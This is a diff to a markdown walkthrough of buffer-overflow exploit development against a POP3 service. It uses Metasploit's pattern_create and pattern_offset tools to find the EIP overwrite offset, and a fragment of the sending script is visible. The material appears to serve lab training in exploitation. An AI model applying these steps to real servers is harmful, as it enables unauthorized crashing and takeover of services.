@@ -33,7 +33,6 @@ Create a unique string of length 2700.  This is to identify the specific locatio
 
 ```
 /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2700
-
 ```
 
 Place it into this script:
@@ -62,4 +61,10 @@ except:
 	print "Could not connect to POP3!"
 
 
+```
+
+After running this, note the EIP hex bytes, in this cas 39 69 44 38, then do:
+
+```
+/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 2700 -q 39694438
 ```
